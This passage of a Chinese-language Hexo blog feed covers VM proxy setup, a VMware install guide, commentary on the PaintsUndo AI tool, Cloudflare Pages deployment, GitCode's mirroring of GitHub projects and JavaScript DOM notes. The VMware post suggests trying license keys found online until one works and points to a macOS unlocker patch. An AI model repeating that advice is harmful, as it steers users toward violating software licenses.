id="Ubuntu">Ubuntu</h3><p>启动系统，进入<code>设置</code>-&gt;<code>网络</code>，在页面中找到<code>网络代理</code>，点击右边的齿轮按钮并改为手动，填写代理地址（按照本文例子填写，请根据自身情况修改！）：</p><table><thead><tr><th>项目名称</th><th>地址</th><th>端口</th></tr></thead><tbody><tr><td>HTTP 代理</td><td>192.168.200.1</td><td>10809</td></tr><tr><td>HTTPS 代理</td><td>192.168.200.1</td><td>10809</td></tr><tr><td>FTP 代理</td><td>【此处不需要填写】</td><td>【保持默认即可】</td></tr><tr><td>Socks 主机</td><td>192.168.200.1</td><td>10808</td></tr><tr><td>忽略主机</td><td>【保持默认即可】</td><td><s>【无】</s></td></tr></tbody></table><p>然后在虚拟机里测试访问国外网站，若主机代理软件日志中出现虚拟机中网站访问记录，且能正常加载网站，则表明配置生效。</p><h2 id="后记">后记</h2><p>Linux 系统中一些程序（例如 wget、curl）等可以自动读取网络代理变量，可以自动检测并使用代理；有些工具可能还需手动配置。</p><p>参考：</p><blockquote><p><a href="https://www.cnblogs.com/zhangweimee/p/9467436.html" rel="external nofollow noreferrer">https://www.cnblogs.com/zhangweimee/p/9467436.html</a><br><a href="https://blog.xzr.moe/archives/124/" rel="external nofollow noreferrer">https://blog.xzr.moe/archives/124/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware 虚拟机安装教程</title>
      <link href="/posts/757254239/"/>
      <url>/posts/757254239/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>（本想记录一个 VMware 提示驱动问题的解决过程，但仅写这个会导致文章过于短，于是顺便吧 VMware 的安装流程记录以下。）</p><h2 id="简要介绍">简要介绍</h2><p>VMware Workstation Pro（后文为方便将其简称为 VMware）是业界标准的桌面 Hypervisor，用于在 Linux 或 Windows PC 上运行虚拟机。它允许您在单一的桌面上同时运行不同的操作系统，是开发、测试和部署新应用程序的最佳解决方案。</p><h2 id="准备工作">准备工作</h2><ul><li>邮箱（最好是 Outlook、Gmail 之类的，尽量不要国内邮箱。如果你的 VMware 不是在官网下载的那么可以忽略这条）</li><li>操作系统镜像（尽量准备 ISO 格式的）</li><li>懂得如何使用搜索引擎</li></ul><h2 id="下载">下载</h2><p>2023 年 11 月 23 日，博通正式宣布完成对虚拟软件服务商 VMware 的收购，交易规模约为 690 亿美元，其中包括 610 亿美元的协约收购价和后者 80 亿美元的债务。2024 年 5 月 14 日，VMware 发布消息称，Workstation Pro 现免费面向个人使用（自版本 17.5.2 开始）。</p><p>由于调整，VMware 软件下载链接已经合并到 Broadcom 网站，原有网站下载已停用，包括旧版 VMware 更新检测可能也无法使用。如果仍然按照原先的方式去下载，可能不成功。</p><p>现在下载需要前往 <a href="https://www.broadcom.com/" rel="external nofollow noreferrer">www.broadcom.com</a> 注册账户并登录（国内部分邮箱注册会提示失败，建议使用<code>outlook</code>、<code>gmail</code>等）。之后点击顶部导航栏的<code>Products</code>-&gt;<code>VMware Products</code>，在下方<code>Results</code>处选择<code>T-Z</code>，下拉找到<code>Workstation Pro</code>，点击跳至<code>VMware Desktop Hypervisors</code>页面（嫌点击麻烦的可以在登录后访问 <a href="https://www.vmware.com/products/desktop-hypervisor.html" rel="external nofollow noreferrer">此处</a> 直达），找到<code>DOWNLOAD FUSION OR WORKSTATION</code>按钮，点击进入<code>My Downloads - VMware Cloud Foundation</code>，拉到底下点击<code>VMware Workstation Pro</code>即可进入相关下载页面。</p><p>有点麻烦，而且 VMware 17.5.2 版本的新的下载地址也有点问题，但 17.5.0 及以前的版本基本可以正常下载。目前可以临时通过网上有人分享出来的第三方下载地址。这里提供我使用的下载地址：<a href="https://softwareupdate.vmware.com/cds/vmw-desktop/ws/" rel="external nofollow noreferrer">CDS Repository</a> 。</p><h2 id="Hyper-V-相关">Hyper-V 相关</h2><p>有些时候 Hyper-V 会跟大部分模拟器、VMware 这些虚拟化软件冲突。启用 Hyper-V 后，Windows 应用层相当于成为了一个运行在 Hyper-V 上的虚拟机，然而 VMware 不能在虚拟机环境中运行，于是乎……不过自 VMware 15.5.5 起，这个问题得到了改善。你只需要在安装完的虚拟机中右键点击<code>设置</code>-&gt;<code>硬件</code>找到<code>处理器</code>一项，将“虚拟化引擎”中几项均打钩，即可实现二者共存。</p><p>如果是家庭版，一般是没有这个功能的（其实你也可以按照网上一些操作去启用这个功能）。</p><p>你也可以通过<code>Win+R</code>（运行）-&gt;输入<code>msinfo32</code>进入“系统信息”窗口，在<code>系统摘要</code>一项拉到最下面，如果四个“Hyper-V”项目的值都为<code>是</code>，则表明该设备可以运行 Hyper-V 虚拟机。</p><p>在<code>控制面板</code>-&gt;<code>程序</code>-&gt;<code>启用或关闭 Windows 功能</code>中有<code>Hyper-V</code>一项。如果想关闭 Hyper-V 功能，需将此处取消框选，然后重启系统。</p><p>总而言之，家庭版用户不需要管这里，跳过此步即可。</p><h2 id="安装">安装</h2><p>双击安装包，出现“欢使用 VMware Workstation Pro 安装向导”界面，点击<code>下一步</code>。在“最终用户许可协议”中勾选“我接受许可协议中的条款”，再次点击<code>下一步</code>。</p><p>如果你已经安装过 VMware，则接下来的页面是“更改、修复或删除安装”，可根据自己需求使用其提供的三个处理方法。</p><p>如果没有安装过，则接下来的页面应为“自定义安装”。在这个界面你可以更改一下安装位置（改完后程序如果没有自动创建 VMware 文件夹，记得手动创建一个）。下面“增强型键盘驱动程序”和“将 VMware Workstation 控制台工具添加到系统 PATH”两项可根据自己需求勾选（不确定的也建议都勾选下），之后点击<code>下一步</code>。</p><p>在“用户体验设置”中，将“启动时检查产品更新”和“加入 VMware 客户体验提升计划”此两项勾选去掉（其实勾选也没有问题，只是某些情况下自动更新弹窗会让人觉得不爽），之后点击<code>下一步</code>。</p><p>在“VMware Workstation 安装向导已完成”中，你可以选择<code>许可证</code>或<code>完成</code>退出向导。<code>许可证</code>可以去网上找，不过那种一般是允许个人使用的，商用不建议；可能输完许可证不能通过，那就多试几个，总有能过的。（按照博通的消息，未来这个界面将会有个人使用的选项，个人用户可能不需要填写许可证就能完整使用）</p><p>完成后按照窗口提示重启系统即可完成整个安装流程。</p><h2 id="安装虚拟机">安装虚拟机</h2><h3 id="创建虚拟磁盘">创建虚拟磁盘</h3><p>在 VMware 软件左上角进入<code>文件</code>-&gt;<code>新建虚拟机</code>，打开“新建虚拟机向导”窗口。通常情况下选择第一项（典型）即可满足大部分需求，然后点击<code>下一步</code>。</p><p>进入“安装客户机操作系统”，选则<code>稍后安装操作系统</code>一项（如果选择<code>安装程序光盘映像文件</code>也行，不过有些镜像会出现<code>该操作系统将使用简易安装</code>，为减少一些奇怪问题，不如不选此项），之后点击<code>下一步</code>。</p><p>“选择客户机操作系统”，不必言说，按照你准备安装的虚拟机的镜像进行选择，然后点击<code>下一步</code>。</p><p>“命名虚拟机”，选择虚拟机位置和名称。最好不要设置与已安装的其他虚拟机重复（如果是安装你这个设备上第一个 VMware 虚拟机则不用管）；虚拟机位置建议挪到别的盘中，如果你硬盘足够大那当我没说。完成后点击<code>下一步</code>。</p><p>“指定磁盘容量”，它默认给出的容量一般是考虑很多方面因素的。极限情况下硬盘可以不需要这么大，例如 Windows10 某些镜像你调 20GB 也不是不能用（MacOS 另当别论，装过就知道了）。还是一样，主机硬盘够大就按你心情设置即可。下面两个选项是虚拟磁盘的储存方式，按照自己需求选择就行，我选择的是<code>将虚拟磁盘拆分成多个文件</code>。完成后</p><p>“己准各好创建虚拟机”，如果你还有其他需求，可以点击<code>自定义硬件</code>进行调整，完成后点<code>完成</code>即可创建虚拟磁盘。刚才的硬件设置，可以在<code>库</code>这一栏找到你的虚拟机，选中后右键点击<code>设置</code>进行编辑。</p><h3 id="挂载镜像与安装系统">挂载镜像与安装系统</h3><p>在<code>库</code>这一栏找到你刚才创建的虚拟机，选中后右键点击<code>设置</code>-&gt;<code>硬件</code>选项卡，找到<code>CD/DVD (SATA)</code>一项，选中<code>使用 ISO 映像文件</code>，点击<code>浏览</code>，找到你准备安装的操作系统的 ISO 镜像文件，点击<code>确定</code>。</p><p>选中该虚拟机，在右侧找到<code>开启此虚拟机</code>。如果上一步的镜像文件正常，则会自动进入安装界面。</p><p>操作系统的安装与使用，与在物理机上的安装方法相同，具体请自行使用搜索引擎了解，这里无法一一列出。</p><h2 id="后续">后续</h2><blockquote><p>与 vmx86 驱动程序的版本不匹配</p></blockquote><p>在安装完该软件之后，会在<code>C:\windows\system32\drivers</code>目录下生成一个<code>vmx86.sys</code>驱动文件。如果在卸载、重装 VMware 时因操作或其他某些原因导致失误，可能会报这个错误。归根结底就是如报错所言：驱动程序“vmx86.sys”的版本不正确。</p><p>在这里有两个解决方法：</p><ol><li>进入<code>C:\windows\system32\drivers</code>目录，找到<code>vmx86.sys</code>并将其重命名（随便什么名称都行），然后再次双击最开始你下载下来的 VMware 安装包（注意那个安装包的版本与你当前安装的 VMware 版本相同），选择“修复”，之后重启系统；</li><li>使用 VMware 安装包自带的卸载功能（双击安装包），将其完全卸载后重新安装（注意点不要一并清理了虚拟机磁盘所在的文件夹），之后重启系统。</li></ol><blockquote><p>MacOS 开机五国、无限重启<br>在安装或更新完VMware后，MacOS锁会重新锁上，需要通过unlocker删除后重新安装补丁。首次使用可以去<a href="https://github.com/paolo-projects/unlocker" rel="external nofollow noreferrer">paolo-projects/unlocker</a>下载最新版本解锁工具，解压出来的文件夹放在与 VMware 同级目录下。</p></blockquote><p>Windows 用户使用管理员权限运行<code>win-build.cmd</code>，等待下载与配置补丁；如果之前运行过此补丁程序，还需先用管理员权限运行<code>win-uninstall.cmd</code>卸载旧的补丁，再执行安装。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaintsUndo：生成绘画过程，但每帧各玩各的</title>
      <link href="/posts/167455342/"/>
      <url>/posts/167455342/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>美国斯坦福大学的研究人员在 7 月 9 日之前宣布推出一款名为 PaintsUndo 的 AI，可以生成插画制作流程视频。通过输入完成的插图，AI 可以自动生成从草稿到上色直到到完成插图的过程的深度伪造，并可用视频的方式输出。</p><p>PaintsUndo 的作者 Lvmin Zhang （ControlNet 也是他的作品）已经将这个项目上传至 GitHub，项目地址为 <a href="https://github.com/lllyasviel/Paints-UNDO" rel="external nofollow noreferrer">https://github.com/lllyasviel/Paints-UNDO</a>。他在 README 中写道；“这是一个旨在提供人类绘画行为基础模型的项目，希望未来的 AI 模型能够更好地符合人类艺术家的真实需求。”“使用 PaintsUndo 查看您自己的作品的不同可能过程，以获得艺术灵感。”</p><p>通过网上的视频可以看出，通过这个程序，输入一张图片，调整相应参数，程序在运行后可以获得这张图的绘画过程。</p><p>程序工作时使用了两个模型 paints_undo_single_frame 和 paints_undo_multi_frame，作者称它们为单帧模型和多帧模型。这两个模型被共同使用，通过推断而获得一些关键帧，之后对这些关键帧进行“插值”，以实际生成一个相对较长的视频。</p><p>我的设备配置较低，不能很好地满足作者推荐的配置，故使用网上他人放出的演示工具。在参看了一些演示视频，又经过自行尝试后，发现效果尚可，一些线稿和上色帧还是可以的。</p><p>仿佛是一个很好的自学工具，甚至还可以制作出完整的绘画流视频……真是如此吗？</p><hr><p>以目前来看，AI 绘画无论技术如何高超，其绘画逻辑与原理，终究与人类绘画是不同的。人绘画是先构思，之后在纸上确定人体比例，从上至下完成大致骨架，之后微调，然后绘制细节，最后上色，很少有画很多细节后“突变”的。对于那些技术已经炉火纯青的画师，作画最基本的流程大概也是如此。</p><p>AI 则不然，就以大家最熟悉的 Stable Diffusion 为例，其核心原理是通过潜在扩散模型（LDM）技术，将原始图像转化为噪声图像，然后通过相应的参数调整，逐渐去除噪声，最终生成画面。既然是扩散，那么它在作画时是不会和人一样去画骨架、描细节、后上色的。如果使用过 SD-WebUI 且开了像实时预览一类的工具的，应该可以看到，在出图的那个窗口，其图像最开始是一团浆糊，后面逐渐变得清晰；如果再开了些什么高清修复，会发现它在基本完成作图后，单独提取了某些区域进行“重绘”，最终完成作图。</p><p>同时，不同的人绘画风格是不同的，哪怕是互相学习之后；AI 则不然，同一个模型，画的图相似度很高。有些图一眼 AI，是因为这模型用得多，一些冷门模型、LoRA，被认出的概率会下降。不过既然跑图方案都差不多，看多了很容易发现共性，例如线条混乱、肢体错位、细节浆糊、AI 模型特有的风格（比如某些像是抹了油的模型）等等。有很多模型，画出来的图风格基本是固定的，除非 LoRA 对图像的控制比较强，但还是能看出点原模型风格的影子在。</p><p>回到 PaintsUndo 上，就以那张初音的图片为例，看看视频，想一想，正常作画，应该不会在描绘精细到那个地步还要大幅度改脸部角度的吧？如果是五官，那还好说；而这种修改是否进行，一般在草图阶段就能判断。再往后看，视频中间的画风至少变了三次，还没算更细致的画风变化。还有一个是山的图片，以它为原图推出的视频，可以更容易看到另一个不太符合常理的地方——上色。我想，正常绘画，应该很少有画一点就精细上色的——万一失误，难以修改。</p><p>对于这个项目，我个人目前很难作评价：如果说糊弄吧，对于那些画师而言，根本不需要；画完拿去欣赏吧，又用不上；拿来自学绘画，我不认为它能比网上到处都是的视频教程好到哪去，甚至不如去 Pixiv 看几张大佬的图；拿来寻找灵感和绘制低完成度的图，勉强可以说有用，但 AI 出图，对于那些要求高的人而言，修线稿不如自己画；希望中途人工干预的，它的工作逻辑又与正常绘画相反，倒不如正向出线稿再改来得方便。如此一来，最终不免会一致想到其负面作用。</p><p>以目前它的演示结果，我个人感觉这模型都没理解这图的创作过程，更像是学习了几段画师自证视频后自己“琢磨”出来的。</p><p>而且，目前用 AI 的，应该还是为目的而非过程的偏多，学画者不必用，大佬不需用，这样来看，这玩意貌似有点开倒车的嫌疑……</p><p>“更好地符合人类艺术家的真实需求”？再等等看吧。当然，未来我对它的评价可能也会发生改变……</p><hr><p>如果让我对 AI 绘画作出评价，这很难说，因目的不同而有不同的看法。假如一定要一个评价，我也只能给出像什么“对立与统一”“量变与质变”“否定与肯定”之类的笼统回答。</p><p>绘画是精神娱乐的东西，如果以欣赏或爱好为目的，那么受众要的就是这样的画这样的劳动这样有名气的画师。如果是为了规模和装饰而非细节，那么 AI 是最合适的。AI 画的图是没有灵魂的，最多只能达到“像有灵魂一样”，这是我的看法之一。</p><p>AI 绘制商业图已经有了，可商用的模型也有了，AI 控图效果也更好了。之所以 AI 先替代绘画，是因为在特定需求中，在 AI 的衬托下，原本的方式性价比低了，对于需要批量出图的人或企业而言，他们要的是廉价高效，可能连细节都不需要顾及，对图片的情操也没什么要求，根本不在意是不是 AI，还会觉得这很时髦，是追赶潮流的表现。</p><p>原本是人画画，后来 AI 出图发展了，画师发布了自证视频，结果被 AI 学习了，然后可能得进一步“升级”，譬如漏手、展示图层，但又无法保证不被 AI 学习，如此重复下去。画师门槛上升，很难说是好是坏。若说其好，可 AI 在挤压底层画师的同时也提升了它们上升的难度，而现在的绘画大佬当年也是这些“底层画师”；若说其坏，使用好它的，还确实能从中获取灵感，又或是提高了出图效率。</p><p>在有些平台已经支持上传 AI 图片，但是需要作出说明，我不知道这是包容还是妥协。但既然是一项新技术，而且又有比较好的发展前景，其发展短时间内是难以扼制的，只能加以限制与引导。人工智能这几年发展，伴随着大量正面与负面的观点迅速发展，加上信息茧房与营销号的流量把持，大多数人对 AI 的观点比较单一。</p><p>但我想，预制菜可能会越来越可口，却终究不是人做的；蒸汽机车刚出来时，人人喊打，但后来蒸汽机车超越了马车，高铁飞机轮船又超越了蒸汽机车；马车没有消亡，而是成了“小众爱好”，不再是人们常用的出行方式了。追求效率的，会选择汽车；追求爱好情趣的，也不见得排斥马车。</p>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Cloudflare Pages 托管静态网站</title>
      <link href="/posts/4242742085/"/>
      <url>/posts/4242742085/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这个站点是部署在 GitHub Pages 上的，如你所见，在某些情况下访问速度令人不敢恭维。之前某次因为未知原因 Cloudflare 又一次在国内受到“特别关照”，不得已关了一些功能。最近感觉站点访问速度出奇地慢，换了 CDN 也未见明显好转。</p><p>一开始在选择部署平台时便对 CF Pages 有耳闻，由于顾虑而未使用。近日尝试，发现其速度确实不错，但晚上得有点难看。</p><p>由于某些原因，写作本文时图床工具出现问题，暂不添加图片，故一些操作流程会写得比较详细（甚至有些多余？）。</p><h2 id="区别">区别</h2><p>注：<a href="https://pages.cloudflare.com/" rel="external nofollow noreferrer">Pages 首页</a> 和<br><a href="https://developers.cloudflare.com/pages/platform/limits" rel="external nofollow noreferrer">Pages 页面 -&gt; 限制</a> 有更详细的说明</p><table><thead><tr><th>比较项</th><th>GitHub Pages（自定义域名，启用 CF 代理）</th><th>Cloudflare Pages</th></tr></thead><tbody><tr><td>特点</td><td>功能相对简单，只支持静态页面，但管理较方便</td><td>配置和管理稍显复杂，可以动态部署（类似于 GitHub Action 但更稳定）；可以连接 Git 仓库（自己账户下无论公开与否），能自动检测仓库变动触发更新（可设置关闭）；有更多可配置项；没有 ban 百度爬虫（但某度爬虫确实比较猛）</td></tr><tr><td>速度</td><td>对于小型网站来说速度不错，复杂网站和大流量情况下速度较慢</td><td>CF 全球 CDN 加速，可以提供更快的网站访问速度，<strong>通常情况下</strong>比 GitHub Pages 快</td></tr><tr><td>免费版限制</td><td>Pages 仓库须设置为公开；每小时最多 10 次提交</td><td>每月最多 500 次提交；只能同时部署一个 Pages；生成将在 20 分钟后超时；站点最多可包含 20,000 个文件，单文件最大 25 MB；单个账户最多 100 个项目</td></tr><tr><td>访问限制</td><td>【普通使用一般达不到限制条件】</td><td>无限请求（与 Worker 不同，Worker 有 100,000 次请求限制），无限带宽（现在有没有调整我暂不知晓）</td></tr></tbody></table><blockquote><p>对 Functions 的请求按 Cloudflare Workers 请求计费。可以在 Workers 文档中找到 Workers 计划和定价。</p><p>对 Pages 函数的请求将计入 Workers 付费计划的配额，包括从函数到 KV 或 Durable Object 绑定的请求。</p><p>在免费和付费计划中，对静态资产的请求都是免费且无限制的。当请求不调用函数时，它被视为静态请求</p></blockquote><p>免费计划将 Workers 和 Pages Functions 的请求合并。对 Pages 上的静态资产的请求将继续免费，且无数量限制。也就是说，如果在 Pages 上部署的是静态网站，不调用函数，那么它于你而言约等于无限使用。</p><h2 id="准备工作与提醒">准备工作与提醒</h2><p>你需要准备：</p><ul><li>GitHub 账户</li><li>Cloudflare 账户</li><li>一枚域名且由 Cloudflare 管理（不求稳定性可以不要）</li><li>拥有如何正确使用搜索引擎的能力</li></ul><p>提醒：</p><ul><li>Worker 不止能用于部署静态页面（譬如前面那篇部署 BingAI 的）</li><li>不知什么原因，<code>.pages.dev</code>访问速度尚可，绑定域名后就不一定了，这可能少数情况</li><li>国内 CDN 效果不明显（有时甚至还“倒退”了）</li><li>鉴于已有不少人拿 Cloudflare 做黑灰产，所以它的 IP 未经优选稳定性未知，故不要指望这么一做就能让你的网站速度媲美国内云厂商的。</li><li>如果条件允许且业务重要，建议使用付费版本；主要业务在国内的建议正规备案、使用国内大厂服务器，那速度绝对起飞</li></ul><h2 id="开始部署">开始部署</h2><p>该方法更适合部署纯静态网站。虽然它本身支持一些框架，但没有 Hexo（和隔壁 Vercel 一样）。如果你想部署静态页面或使用的框架不被支持，则按照这一条走。</p><p>打开 <a href="https://dash.cloudflare.com/" rel="external nofollow noreferrer">Cloudflare 控制台</a>，进入主页面（此时不需要进入下面的域名管理页面，如果没添加自己域名请忽视这条提示），在左侧菜单下滑进入<code>Workers 和 Pages</code>-&gt;<code>概述</code>-&gt;<code>创建应用程序</code>，选择<code>Pages</code>选项卡，在<code>通过导入现有 Git 存储库创建</code>这行字下面点击蓝色<code>连接到 Git</code>按钮。</p><p>进入<code>从您的帐户部署站点</code>页面。由于我的站点文件托管于 GitHub，因此在该页面选择<code>GitHub</code>选项卡并选择 GitHub 帐户与储存库。如果未显示存储库，请按照网页提示安装 GitHub APP（可选择全局安装或指定仓库安装）<s>并在 GitHub 上为 Cloudflare Pages 应用配置存储库访问权限</s>，等待页面跳转（没跳转的手动返回）。如果安装成功，这里会正常显示你的目标仓库名称。选中后点击右下角蓝色<code>开始设置</code>按钮。</p><p>进入<code>设置构建和部署</code>页面。在这里你会看到这些配置项：</p><table><thead><tr><th>配置项</th><th>含义</th></tr></thead><tbody><tr><td>项目名称</td><td>不一定与前面选择的 Git 仓库（例如前面选择的 GitHub 仓库，下同）同名。此处的填写将与默认域名有关，例如填写<code>xxx</code>则部署完后提供的默认域名为<code>xxx.pages.dev</code>。部署完后貌似不能修改这里的<code>xxx</code>，改默认域名可以删除项目后重新部署</td></tr><tr><td>生产分支</td><td>与 Git 仓库分支相同。如果你将文件推送到 Git 仓库的 main 分支（通常这是默认分支）且你希望直接展示的是 main 分支下的文件，那么这里你应该选择 <code>main</code>。其他分支将被部署在预览环境</td></tr><tr><td>框架预设</td><td>如果你想让它原模原样拉取仓库，那么这里请选择 None</td></tr><tr><td>构建命令</td><td>如果你想让它原模原样拉取仓库，那么这里你可以填写<code>exit 0</code></td></tr><tr><td>构建输出目录</td><td>默认为根目录，对应 Git 仓库的根目录</td></tr></tbody></table><p>如果你正巧使用 Hexo 且只推送了源文件而非渲染后的文件，最后三项你可以这么填：</p><table><thead><tr><th>配置项</th><th>填写内容</th></tr></thead><tbody><tr><td>框架预设</td><td>None</td></tr><tr><td>构建命令</td><td><code>hexo clean&amp;&amp;hexo generate</code></td></tr><tr><td>构建输出目录</td><td>public</td></tr></tbody></table><p>如果你不想要 Pages 默认 Node 版本，则还需点击下方蓝色<code>环境变量（高级）</code>字样，点击蓝框<code>+ 添加变量</code>按钮，填写左右两个文本框，左侧为<code>NODE_VERSION</code>，右侧为三段式版本号，填完后应类似于<code>NODE_VERSION=20.11.1</code>。保存，然后点击右下角蓝色<code>保存并部署</code>按钮。</p><p>进入<code>构建和部署</code>页面。等待执行完成后，回到<code>Workers 和 Pages</code>-&gt;<code>概述</code>，进入你刚才部署的 Pages，等待一会儿，便可以使用它提供的<code>【项目名称】.pages.dev</code>域名访问了。</p><h2 id="自定义">自定义</h2><blockquote><p>实际上，你可以把 Pages 理解成特殊的 Worker，一些配置项可以互相借鉴，故此处一带而过。</p></blockquote><p>如果你希望后期更改环境变量（例如 Node 版本），请在该项目主页进入<code>设置</code>选项卡，找到<code>环境变量</code>进行设置。</p><p>在<code>设置</code>选项卡<code>构建与部署</code>选项中点击<code>分支部署控制</code>-&gt;<code>生产分支</code>-&gt;<code>配置生产部署</code>按钮，将<code>启用自动生产分支部署</code>取消打钩，可取消自动部署。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitCode 批量搬运 GitHub 项目</title>
      <link href="/posts/3860265803/"/>
      <url>/posts/3860265803/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近看到一个消息，<a href="GitCode">https://gitcode.com/</a> 平台（CSDN 的）正在批量搬运 Github 开源项目，甚至非常贴心地将 <a href="http://README.md" rel="external nofollow noreferrer">README.md</a> 中的链接替换为 GitCode 的链接、自动创建开发者主页（不过这个主页不属于原开发者）。</p><p><img src="https://s2.loli.net/2024/06/30/6sM24Bp1W3zALZl.jpg" alt=""></p><p><img src="https://s2.loli.net/2024/06/30/STXD6pPLAgVKuYl.jpg" alt=""></p><p>至于它为什么要这样搬运，估计也是因为它在搜索引擎中流量很大，想借此引流，进一步提升自己的收益。但它在搬运时并非完全同步，我猜它是觉得某些项目没有流量、没有为其引流所用的价值所以没有搬来，因为有些不出名的项目或开发者你无法在上面搜到。至于我猜测它是依据“标星”、“收藏”等数据进行同步，是因为它甚至把一些“键 z”、“魔法上网”的仓库也同步过来了（据说这网站还因此被封过）。。。</p><p>后来嘛，很多原作者知道了，在相关仓库 issue 中发消息要求官方删除相关仓库或组织、账户。GitCode 官方成员虽然进行了回复并处理，称“紧急整改”，但一段时间之后这些仓库才不被搜索到（先是“删除”但实际上与“屏蔽”类似，之后是搜索左侧有数量但结果栏不显示。我来晚了，现在左侧“类型”那里直接连数量都不显示了，不管有无结果展示）。而且由于这其中有很多账户和组织不是开发者自己创建的，他们无法直接进行处理。如果删除仓库，需要开发者使用 GitHub 账户进行授权进行接管。</p><p>众所周知，如果在网上找些编程方面的资料，很多人会选择在搜索词后加上<code>-site:*.csdn.net</code>。原因？以前还好，如今吃相愈发难看。无论是搬运文章（有自称原创的，也有连原文错误都不改而拿来的）还是下载收费（单纯这点也非不可接受，直到你发现很多免费甚至开源的项目也出现在了它的收费下载中），又或是无处不在的广告等等，都已经让它不再是查找资料的首选平台了（有好的内容，但比重小）。</p><p>CSDN 的 SEO 农场很有实力，搜索引擎第一页往往便是它的链接，例如百度和 Bing。可以看出来 CSDN 很想找回昔日的地位，不过它干出的那些行为恐怕只能适得其反。GitCode 已经出来有挺长时间了，期间没闹出过什么问题，项目加速效果也尚可。这次它作出搬运 GitHub 的仓库来丰富自己平台内容的决定，不知是哪个人喝多了提出来的。初看觉得这个行为有些逆天，但再看看 CSDN 博客和下载站，仿佛这一幕也得到了合理的解释。</p><p>参考：</p><blockquote><p><a href="https://www.ithome.com/0/778/049.htm" rel="external nofollow noreferrer">https://www.ithome.com/0/778/049.htm</a><br><a href="https://www.landiannews.com/archives/104662.html" rel="external nofollow noreferrer">https://www.landiannews.com/archives/104662.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漫谈杂言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在 JavaScript 中修改 HTML 内容</title>
      <link href="/posts/3029518241/"/>
      <url>/posts/3029518241/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>起因……</p></blockquote><p>使用 Hexo 搭建网站的，大抵不会满足于主题的默认样式，尤其是对于某些适合魔改的主题而言。然而，若不想止步于简单的样式调整，便不可避免要动主题源码。虽然快捷，但后续升级时……</p><p>大型修改好说，但微小的地方改多了，将来升级时可能会记不住。我就想，在一种极端情况下，不直接改动源码，能不能实现这些改动……</p><blockquote><p>早在几年前，GitHub 上已经有文章介绍如何使用原生 js 代替 jQuery 操作 DOM，例如：<a href="https://github.com/camsong/You-Dont-Need-jQuery/blob/master/README.zh-CN.md" rel="external nofollow noreferrer">You-Dont-Need-jQuery<br></a></p></blockquote><p>使用 jQuery 完成这些事情确实能少写很多东西，但我的站点已经够慢了，总不能什么时候都引入这么大个库吧（虽然但是，嫌慢何不直接改代码……）。</p><p>本文中方法是通用的；相关例子不一定涵盖 js 相应功能的所有用处；本文中只列举了很小一部分 js 操作 DOM 的方法。</p><p>这是一篇笔记，而不是教程。<strong>如果想完整学习，建议直接去看 MDN、菜鸟教程这些地方</strong></p><h2 id="选择-DOM">选择 DOM</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myButton&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法用于获取具有指定 id 属性的元素。在这个例子中，它会返回 id 为 myButton 的元素。如果没有找到匹配的元素，则返回 null。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法返回一个类数组对象，包含所有具有指定类名的元素。在这个例子中，它会返回所有具有 <code>class</code> 为 <code>a</code> 的元素集合。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;tagName&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法返回一个包含所有指定标签名的元素的集合（HTMLCollection）。例如，document.getElementsByTagName(‘div’) 会返回文档中所有的 <code>&lt;div&gt;</code> 元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;name&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法返回一个包含所有具有指定 name 属性的元素的集合（NodeList）。例如，document.getElementsByName(‘username’) 会返回所有 name 属性为 username 的元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span 